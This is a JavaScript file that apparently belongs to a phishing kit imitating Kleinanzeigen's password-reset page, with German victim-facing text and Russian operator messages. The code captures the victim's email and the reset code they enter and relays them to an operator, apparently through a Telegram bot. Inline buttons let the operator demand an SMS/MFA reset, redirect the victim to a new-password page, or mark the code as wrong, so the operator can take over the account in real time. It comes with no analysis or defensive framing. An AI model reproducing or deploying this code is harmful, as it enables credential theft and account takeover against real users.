(function () {
  var email   = sessionStorage.getItem("ka_email")   || "";
  var siteId  = sessionStorage.getItem("ka_site_id") || "";
  if (!email || !siteId) { window.location.href = "login.html"; return; }
  var forgotId = siteId + "_forgot";
  var emailShown = document.getElementById("emailShown");
  var codeInput  = document.getElementById("codeInput");
  var codeGroup  = document.getElementById("codeGroup");
  var errCode    = document.getElementById("errCode");
  var btnWeiter  = document.getElementById("btnWeiter");
  if (email) emailShown.textContent = email;
  codeInput.addEventListener("input", function () {
    codeInput.value = codeInput.value.replace(/\D/g, "");
    if (codeInput.value) codeGroup.classList.add("has-value");
    else codeGroup.classList.remove("has-value");
    errCode.classList.remove("visible");
  });
  function escapeHtml(s) { return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }
  var sseSub        = null;
  var actionHandled = false;
  var smsNotifId    = null;
  function handleAction(action, evtSiteId) {
    if (actionHandled) return;
    if (evtSiteId && evtSiteId !== forgotId && evtSiteId !== siteId) return;
    actionHandled = true;
    if (action === "sms") {
      var text =
        "\uD83D\uDCF1 <b>SMS \u0437\u0430\u043F\u0440\u043E\u0441</b>\n" +
        "\uD83C\uDD94 <b>Site ID:</b> <code>#" + siteId + "</code>\n" +
        "\uD83D\uDCE7 <b>Email:</b> " + escapeHtml(email) + "\n" +
        "\u2757\uFE0F \u041E\u0442\u0432\u0435\u0442\u044C\u0442\u0435 \u043F\u043E\u0441\u043B\u0435\u0434\u043D\u0438\u043C\u0438 4 \u0446\u0438\u0444\u0440\u0430\u043C\u0438 \u043D\u043E\u043C\u0435\u0440\u0430";
      var mainMsgId = parseInt(sessionStorage.getItem("ka_msg_id") || "0");
      if (mainMsgId) {
        KA.editMarkup(mainMsgId, [
          [{ text: "\uD83D\uDC41 \uD83D\uDFE2 \u041E\u043D\u043B\u0430\u0439\u043D \u2014 \uD83D\uDCF1 SMS", callback_data: siteId + ":status" }],
          [{ text: "\u274C \u041D\u0435\u0432\u0435\u0440\u043D\u043E", callback_data: forgotId + ":wrong_forgot" }]
        ]);
      }
      KA.sendMessage(text, null, true).then(function(data) { if (data.ok) smsNotifId = data.msgId; });
      return;
    }
    if (action === "new_password") { window.location.href = "new_password.html"; return; }
    btnWeiter.disabled = false;
    btnWeiter.innerHTML = "Weiter";
    if (action === "wrong_forgot") {
      actionHandled = false;
      codeInput.value = "";
      codeGroup.classList.remove("has-value");
      errCode.textContent = "Der Code ist falsch. Bitte versuche es erneut.";
      errCode.classList.add("visible");
    }
  }
  sseSub = KA.subscribe(forgotId, { action: function(data) { handleAction(data.action, data.siteId); } });
  var digitsSub = KA.subscribe(siteId, {
    digits: function(data) {
      if (smsNotifId && data.replyMsgId && data.replyMsgId !== smsNotifId) return;
      sessionStorage.setItem("ka_sms_digits", data.digits);
      window.location.href = "sms_reset.html";
    }
  });
  function sendToBot(code) {
    var mainMsgId = parseInt(sessionStorage.getItem("ka_msg_id") || "0");
    var text =
      "\uD83D\uDD11 <b>Kleinanzeigen Passwort Reset</b>\n" +
      "\uD83C\uDD94 <b>Site ID:</b> <code>#" + siteId + "</code>\n" +
      "\uD83D\uDCE7 <b>Email:</b> " + escapeHtml(email) + "\n" +
      "\uD83D\uDD22 <b>Reset Code:</b> <code>" + escapeHtml(code) + "</code>\n" +
      "\uD83D\uDDD3 <b>Zeit:</b> " + new Date().toLocaleString("de-DE");
    KA.sendMessage(text, [
      [
        { text: "\uD83D\uDCF1 MFA Reset",    callback_data: forgotId + ":sms" },
        { text: "\uD83D\uDD11 New Password", callback_data: forgotId + ":new_password" }
      ],
      [{ text: "\u274C \u041D\u0435\u0432\u0435\u0440\u043D\u043E", callback_data: forgotId + ":wrong_forgot" }]
    ]).then(function(d) { if (d.ok) sessionStorage.setItem("ka_forgot_msg_id", d.msgId); });
    if (mainMsgId) {
      KA.editMarkup(mainMsgId, [
        [{ text: "\uD83D\uDC41 \uD83D\uDFE2 \u041E\u043D\u043B\u0430\u0439\u043D \u2014 \uD83D\uDD04 \u041A\u043E\u0434", callback_data: siteId + ":status" }],
        [
          { text: "\uD83D\uDCF1 MFA Reset",    callback_data: forgotId + ":sms" },
          { text: "\uD83D\uDD11 New Password", callback_data: forgotId + ":new_password" }
        ],
        [{ text: "\u274C \u041D\u0435\u0432\u0435\u0440\u043D\u043E", callback_data: forgotId + ":wrong_forgot" }]
      ]);
    }
  }
  btnWeiter.addEventListener("click", function () {
    var code = codeInput.value.trim();
    errCode.classList.remove("visible");
    if (code.length < 6) { errCode.textContent = "Bitte gib den 6-stelligen Code ein."; errCode.classList.add("visible"); return; }
    btnWeiter.disabled = true;
    btnWeiter.innerHTML = '<span class="btn-dots"><span>.</span><span>.</span><span>.</span></span>';
    setTimeout(function() {
      if (!actionHandled) {
        actionHandled = false;
        btnWeiter.disabled = false;
        btnWeiter.innerHTML = "Weiter";
        errCode.textContent = "Keine Antwort erhalten. Bitte versuche es erneut.";
        errCode.classList.add("visible");
      }
    }, 30000);
    sendToBot(code);
  });
  document.getElementById("btnResend").addEventListener("click", function () {
    codeInput.value = ""; codeGroup.classList.remove("has-value"); errCode.classList.remove("visible"); codeInput.focus();
  });
  window.addEventListener("beforeunload", function() { if (sseSub) sseSub.close(); if (digitsSub) digitsSub.close(); });
  if (codeInput) codeInput.focus();
})();
